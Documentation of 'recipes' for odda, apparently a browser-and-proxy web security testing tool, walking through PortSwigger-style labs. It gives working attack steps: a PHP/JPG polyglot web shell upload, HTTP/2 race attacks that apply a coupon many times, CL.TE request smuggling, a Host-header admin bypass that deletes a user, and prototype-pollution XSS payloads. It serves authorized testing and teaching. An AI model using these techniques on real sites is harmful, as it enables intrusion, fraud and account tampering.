# Recipes

Worked examples composing odda's tools into full investigations. Each recipe names the tools it uses; the per-concept references live in the other `odda://docs/` resources (`odda://docs/request-crafting`, `odda://docs/flows`, `odda://docs/dynamic-analysis`, `odda://docs/userscripts`, `odda://docs/proxy-scripts`).

## Recipe: DOM data-flow tracing (source to sink)

A worked example of the three dynamic-analysis concepts (Wrap + Coverage + Logpoint) composing with page interaction to trace untrusted data from where it enters the page (a `postMessage` handler) to where it's checked or sinks. The same pattern applies to any DOM data-flow question — hashchange listeners, URL-parameter consumers, `location.hash`-to-`innerHTML` flows — by pointing Wrap/Coverage/Logpoint at the relevant source or sink.

The workflow: Wrap confirms the API touch, Coverage finds the code path, Logpoint reads the locals at the interesting line. Each concept observes without modifying behavior (the page never pauses).

### 1. Wrap `addEventListener` to confirm a `message` handler is registered and capture the handler reference

```
wrap_calls_add(browser_id="kqzfm", tab_id=1, name="ael", expr="EventTarget.prototype.addEventListener")
navigate(browser_id="kqzfm", tab_id=1, url="http://target/")   # re-navigate so the wrap runs
wrap_dump(browser_id="kqzfm", tab_id=1)   # look for a call with args[0]=="message"; args[1] is the handler (its source is in the record)
```

### 2. Coverage to find which code path the handler runs when a message arrives

```
coverage_start(browser_id="kqzfm", tab_id=1)
eval(browser_id="kqzfm", tab_id=1, js="window.postMessage({type: 'probe'}, '*')")
coverage_stop(browser_id="kqzfm", tab_id=1)   # find the script URL + block ranges that ran
```

### 3. Read the handler source to find the origin-check line

Read the handler source from the captured flow body (the script URL from coverage maps to a flow in `.odda/flows/`) to find the origin-check line.

### 4. Logpoint at that line to read the locals the check operates on

```
logpoint_add(browser_id="kqzfm", tab_id=1, url=<script-url>, line=<n>, col=<n>, expr="event.origin")
eval(browser_id="kqzfm", tab_id=1, js="window.postMessage({type: 'probe'}, 'https://evil/')")
logpoint_dump(browser_id="kqzfm", tab_id=1)   # read the captured origin value
```

### 5. Verdict

If the logpoint records an attacker-controllable origin, the handler does not validate origin and is vulnerable.

### With page interaction (user-triggered behavior)

The same recipe composes with the `page_*` tools when the behavior is triggered by user input rather than a `postMessage` call. Snapshot to find the form/button, click or fill to trigger the behavior, then observe with Wrap/Coverage/Logpoint:

1. **Snapshot** to find the target:
   ```
   page_snapshot(browser_id="kqzfm", tab_id=1)   # find the ref for the submit button
   ```
2. **Wrap** `EventTarget.prototype.addEventListener` (as above), then **click** the button to trigger the handler:
   ```
   page_click(browser_id="kqzfm", tab_id=1, ref="e2")   # click the submit button by ref
   ```
3. **Coverage** to find which code path ran as a result of the click, **Logpoint** to read locals at the interesting line — same as above.

The page-interaction step replaces `eval` with `js="window.postMessage(...)"` when the trigger is a user action (form submit, button click, file upload) rather than a programmatic call.

## Recipe: interact with a page by snapshot and ref (forms, uploads, clicks)

Snapshot the page to discover element **refs** (`eN`), then pass a ref to `page_click` / `page_fill` / `page_upload` to act on that element. This is the ref-driven alternative to hand-written CSS selectors via `eval`, and is more robust on minified SPAs where selectors are unstable but the a11y tree is stable.

### 1. Open a browser and navigate

```
browser_open()            # returns {browser_id, tab_id, status}
navigate(browser_id=B, tab_id=T, url=<url>)
```

### 2. Snapshot to find refs

```
page_snapshot(browser_id=B, tab_id=T)
# returns the a11y tree as YAML-ish text with [ref=eN] tags
# grep the text for the element you want (a textbox, a button, a link)
```

On a large page, search instead of shipping the tree:

```
page_find(browser_id=B, tab_id=T, regex="Log in|Sign in")
# returns each match with a few lines of context and its ancestor
# path from the root — pluck the [ref=eN] and act on it directly
```

To cap how deep the tree renders (boundary nodes render without children), pass `depth`:

```
page_snapshot(browser_id=B, tab_id=T, depth=2)
```

After an action, re-read only what changed instead of the whole tree:

```
page_snapshot(browser_id=B, tab_id=T, diff=True)
# returns only the changed lines: "-" from the previous snapshot,
# "+" from the current one (fresh [ref=eN] tags, directly actionable),
# each hunk headed by its ancestor path; "(no changes since previous
# snapshot)" when nothing moved
```

Every `page_snapshot` stores the baseline for its depth, so consecutive diffs chain; navigating clears them (the next diff returns the full tree, announced by a note). Geometry and refs never read as change — scrolling is not a diff.

Refs are valid until the element leaves the DOM (navigation, SPA swap). Re-snapshot (or re-find) after any content change; existing refs keep working without re-snapshotting.

### 3. Fill form fields by ref

```
page_fill(browser_id=B, tab_id=T, ref=<ref>, value=<value>)
```

Fill each input/textarea/select in turn, then snapshot again if you need the submit button's ref (it may have appeared after the page settled).

### 4. Click buttons / links by ref

```
page_click(browser_id=B, tab_id=T, ref=<ref>)
```

Clicking may trigger navigation or an SPA swap — snapshot again to read the new state. Refs from the pre-click snapshot are stale after a navigation.

### 5. Handle file inputs (the aria-label gotcha)

A nameless `<input type="file">` is omitted from the a11y tree, so it won't appear in the snapshot. Give it an `aria-label` via `eval`, re-snapshot, then upload by the new ref:

```
eval(browser_id=B, tab_id=T, js="document.querySelector('input[type=file]').setAttribute('aria-label','upload')")
page_snapshot(browser_id=B, tab_id=T)      # now the input has a ref
page_upload(browser_id=B, tab_id=T, ref=<ref>, files=[<path>])
```

After `page_upload` sets the file on the input, click the form's submit button by ref to POST it.

### Worked example: polyglot web shell upload

The PortSwigger "RCE via polyglot web shell upload" lab needs a PHP/JPG polyglot uploaded as an avatar. Snapshot the login page, fill username + password by ref, click "Log in". On the account page the file input has no accessible name, so `eval` an `aria-label` onto it, re-snapshot, then `page_upload` the polyglot (`exiftool -Comment="<?php ... ?>" input.jpg -o polyglot.php`) by the new ref and click "Upload". Navigating to `/files/avatars/polyglot.php` executes the PHP; read the secret out of `document.body.innerText` via `eval`, then POST it to `/submitSolution` with a `fetch` from `eval` to clear the lab.

### Coordinate targeting via annotated screenshot

When the a11y tree can't name the target (canvas, custom hit-testing, elements behind overlays), get pixels and refs in one artifact and act by coordinates:

```
screenshot(browser_id=B, tab_id=T, annotate=true)
# JPEG with a numbered marker on every ref's box; the response's
# CSV legend (n,ref,x,y,w,h) maps each marker number to its ref
# and viewport box
page_click(browser_id=B, tab_id=T, x=..., y=...)   # box coords from the legend
```

`screenshot(annotate=true)` is the visual counterpart of `page_snapshot`'s `boxes: true` — the legend's boxes are the same geometry. Coordinates are viewport CSS px from the viewport's top-left — the same space `page_click`/`page_hover` accept.

## Recipe: race conditions / limit overrun (concurrent send)

A worked example of `request_send` with `repeat` to race a server-side check-then-write window (the classic limit-overrun attack — a "once per user" coupon applied N times because N concurrent requests all pass the check before any write lands). The same pattern applies to rate-limit bypass and any TOCTOU window where the same request fired many times at once slips through.

The workflow: capture the target request, clone it as an editable request, fire N concurrent copies over HTTP/2 (single-packet stream-multiplex), count the successes.

### 1. Capture the target request from the browser

Navigate and trigger the action once (e.g. apply a coupon) so the request is captured as a flow. Find the flow in `.odda/flows/flows.jsonl` (e.g. `rg '"method":"POST".*"path":"/cart/coupon"' .odda/flows/flows.jsonl`).

```
navigate(browser_id="kqzfm", tab_id=1, url="https://target/")
# ... trigger the action in the page (click the apply-coupon button) ...
page_click(browser_id="kqzfm", tab_id=1, ref=<button-ref>)
```

### 2. Clone the flow as an editable request

Clone the captured flow so you can re-send its exact bytes (including the auth cookie and CSRF token, which are in the request body/headers).

```
request_clone(flow_id=<flow-id>, name="coupon", force=True)
```

The cloned request carries the session cookie and CSRF token in its bytes — `request_send` is out-of-page (raw bytes, no browser), so the auth is in the request file, not pulled from the browser at send time.

### 3. Fire N concurrent copies over HTTP/2

`repeat=N` opens one HTTP/2 connection and sends N copies as concurrent streams with the last-byte single-packet technique (all N HEADERS frames in one TLS record) so they arrive at the server near-simultaneously. If the request line says `HTTP/1.1`, edit it to `HTTP/2` first (H2 single-packet is what makes the race reliable; H1 `repeat` opens N parallel connections with residual TLS-handshake spread).

```bash
# If the cloned request line says HTTP/1.1, switch to HTTP/2 for the race:
sed -i 's/HTTP\/1.1/HTTP\/2/' .odda/requests/coupon/request
```

```
request_send(name="coupon", repeat=20, insecure=True, timeout=15)
```

### 4. Count the successes

Each of the 20 copies gets its own flow record (one-request-one-response). Read back how many succeeded (e.g. a 302 "coupon applied" vs a 200 "already applied" or 409 "limit reached"). Filter `flows.jsonl` for the race's host/path and count the status codes:

```bash
python3 -c '
import json
records = [json.loads(line) for line in open(".odda/flows/flows.jsonl")]
race = [r for r in records if r["host"] == "target" and r["path"] == "/cart/coupon"]
applied = sum(1 for r in race[-20:] if r["status_code"] == 302)
denied = sum(1 for r in race[-20:] if r["status_code"] in (200, 409))
print(f"applied={applied} denied={denied}")
'
```

If the race slipped through the window, `applied` will be > 1 (the single-packet technique aims for all N to land in the window; in practice 3-15 typically succeed against a naive check-then-write, which is enough to overrun a "once per user" limit). If only 1 succeeded, re-run — the race is probabilistic against real servers.

### When to use `repeat` vs `eval` with `Promise.all(fetch)`

`repeat` is out-of-page: raw bytes, no browser cookies — the Burp-Repeater model. Use it when you've cloned the request (the auth is in the bytes) or when the endpoint doesn't need cookies.

Use `eval` running `Promise.all(Array(N).fill().map(()=>fetch(url,{...})))` from the page when the request is cookie-gated and you want the browser to carry the session automatically. The browser's HTTP/2 multiplexing also delivers near-simultaneously, though without the single-packet guarantee (the browser flushes each fetch's frames separately, so there's more spread than `repeat`'s single-TLS-record flush).

**Footgun:** concurrent `eval` calls on the same tab **serialize** — "race harder by firing parallel evals" silently does nothing. Use one `eval` with `Promise.all` for concurrency, not many parallel `eval` calls.

### Multi-endpoint races (N different requests concurrently)

For state-machine races where N *different* endpoints must be hit concurrently (e.g. login + checkout racing the same state transition), use `names` over HTTP/2: author each request as its own editable request file, then pass all names with `HTTP/2` request lines — they send as concurrent streams on one connection (the same single-packet technique).

```
request_clone(flow_id=<login-flow-id>, name="login", force=True)
request_clone(flow_id=<checkout-flow-id>, name="checkout", force=True)
# Ensure both request lines say HTTP/2
request_send(names=["login", "checkout"], insecure=True, timeout=15)
```

## Recipe: replay and modify a captured request byte-for-byte

Clone a captured flow (or craft one from scratch) into an editable request, edit the raw bytes, send it, and read the response — bypassing the browser for exact wire control. This is the core raw-request workflow for smuggling, header injection, parser-differential, vhost/host-header, and any test where you need precise bytes on the wire.

### 1. Capture a request to clone (browser → proxy)

Navigate to the target through odda's proxy so the request is captured as a flow, then find its id in `flows.jsonl` (e.g. `grep target.example .odda/flows/flows.jsonl`).

```
browser_open()
navigate(browser_id=B, tab_id=T, url="https://target.example/")
```

### 2. Clone the flow into an editable request

```
request_clone(flow_id=<flow-id>, name=<name>)
# writes .odda/requests/<name>/request (raw bytes) + meta.json (scheme/host/port)
```

Craft from scratch instead (when there's no flow to clone):

```
request_new(name=<name>, host=<host>, protocol="https", port=443)
```

### 3. Edit the request bytes (CRLF warning)

Write the `request` file with the exact bytes you want on the wire. **Use `printf` or `sed 's/$/\r/'` — heredocs emit `\n` and will fail on the wire.** The file holds request line + headers + blank line + body, all CRLF-terminated.

```
printf 'POST / HTTP/1.1\r\nHost: target.example\r\nHeader: value\r\n\r\nbody' \
  > .odda/requests/<name>/request
xxd .odda/requests/<name>/request   # verify \r\n throughout
```

### 4. Send it

```
request_send(name=<name>)                          # exact bytes, no framing fixes
request_send(name=<name>, fix_content_length=True)  # recompute CL after body edits
```

`request_send` is single-shot (no redirects), records the flow to `.odda/flows/<NNNNN>/`, and returns the `flows.jsonl` record. The sent request is durable before the network exchange.

### 5. Read the response

Read `response_body.*`, `response_headers`, and (if present) `error` under `.odda/flows/<id>/`. The send's return value names the flow `id`; the body file is `.odda/flows/<id>/response_body.<ext>`.

### 6. Re-send if needed

Many attacks need the request sent more than once (smuggling poisons the back-end's stream — the second send observes the effect). Re-run `request_send(name=<name>)`; each send is a fresh flow with its own id.

### Worked example: HTTP request smuggling (CL.TE)

Front-end reads `Content-Length`, back-end reads `Transfer-Encoding: chunked`; a `0\r\n\r\nG` body leaves a trailing `G` that prefixes the next request's method. Clone a captured `GET /`, rewrite it to the smuggling request (POST with both `Content-Length: 6` and `Transfer-Encoding: chunked`, body `0\r\n\r\nG`), and send twice. The second response body reads `"Unrecognized method GPOST"` — the smuggled `G` prefixed `POST`, confirming the back-end parsed the chunked body and left the prefix on the stream. Send once to poison, send again to observe: that two-send cadence is the recurring shape of CL.TE/TE.CL labs.

### Worked example: Host header authentication bypass

Clone a captured `GET /admin` (401, "only local users") from `flows.jsonl`, rewrite the `Host` header to `localhost` via `printf` (CRLF), and send. The app trusts the `Host` header for the "is this local?" check, so `Host: localhost` grants admin access even though the TCP destination (in `meta.json`) is still the real lab host. Re-edit the same file to `GET /admin/delete?username=carlos` (keep `Host: localhost` and the session cookie) and send again.

## Recipe: inject before page scripts via userscript, then observe

Install a userscript that runs at `document_start` (before the page's own scripts) to inject hooks or payloads, then use `eval`/`wrap_*`/`coverage_*` to observe how the page's scripts interact with the injected code — the userscript + dynamic-analysis composition for any "I need to run code before the page" investigation (prototype pollution, DOM clobbering, pre-script `window` mods). Wraps *are* userscripts (`wrap_calls_add`/`wrap_access_add` inject at `document_start`).

### 1. Open a browser and navigate to the target

```
browser_open()            # returns {browser_id, tab_id, status}
navigate(browser_id=B, tab_id=T, url=<url>)
```

### 2. Test the pollution source via eval

```
navigate(browser_id=B, tab_id=T, url="<url>?__proto__[foo]=bar")
eval(browser_id=B, tab_id=T, js="Object.prototype.foo")
# "bar" confirms the query-string parser merges __proto__ into Object.prototype
```

### 3. Read the page's JS source from captured flows

```
grep <host> .odda/flows/flows.jsonl          # find the JS flow ids
# read .odda/flows/<id>/response_body.js for each, looking for:
#   - a query parser that merges into objects without sanitizing __proto__ (the source)
#   - a property read from a config/options object and passed to a sink (the gadget)
```

### 4. (Optional) wrap/coverage to find the gadget if source-reading isn't enough

```
wrap_access_add(browser_id=B, tab_id=T, name="proto", expr="Object.prototype")   # observe proto reads
navigate(browser_id=B, tab_id=T, url="<url>?__proto__[foo]=bar")   # re-navigate so the wrap runs
wrap_dump(browser_id=B, tab_id=T)
# or: coverage_start → navigate with a test payload → coverage_stop
```

### 5. Craft the payload URL and navigate to trigger

```
# sink is innerHTML: ?__proto__[<gadgetProperty>]=<img src=x onerror=alert(1)>
# sink is script.src: ?__proto__[<gadgetProperty>]=data:text/javascript,alert(1)
navigate(browser_id=B, tab_id=T, url="<url>?__proto__[<gadgetProperty>]=<payload>")
```

### 6. Confirm the result via the dialog it fires

```
navigate(browser_id=B, tab_id=T, url="<url>?__proto__[<gadgetProperty>]=<payload>")
# → {dialog: {type: "alert", message: "1", ...}}   — the payload's alert fired
```

The dialog's details come back in the result; `dialog_handle` to resolve it (or dismiss to deny a `confirm`-gated action).

For a payload that fires inside a cross-origin iframe, the dialog still opens (the browser owns dialogs, not the frame) — but to pin down *which* frame ran the payload, test on a same-origin instance of the page.

### Worked example: DOM XSS via client-side prototype pollution

Navigated to the lab, then to `?__proto__[foo]=bar`; `eval` with `js="Object.prototype.foo"` returned `"bar"`, confirming `deparam.js` is the source. Grepping `flows.jsonl` for the lab host surfaced `searchLogger.js`; reading its body showed `config = {params: deparam(...)}` then `if (config.transport_url) { script.src = config.transport_url }` — `transport_url` is never set on `config`, so it's inherited from the polluted prototype and flows into a `script.src` sink. Navigating to `?__proto__[transport_url]=data:text/javascript,alert(1)` injected a script that called `alert(1)`; the `navigate` result carried the open `{type: "alert"}` dialog as proof the payload executed, and `dialog_handle` with `accept` closed it so the page (which showed "Solved") kept running. No custom userscript was needed here — dialog results plus `eval`/flow reading sufficed. When the page's own scripts sanitize or the gadget needs a pre-script hook, author a userscript and `userscript_install` it, then re-navigate.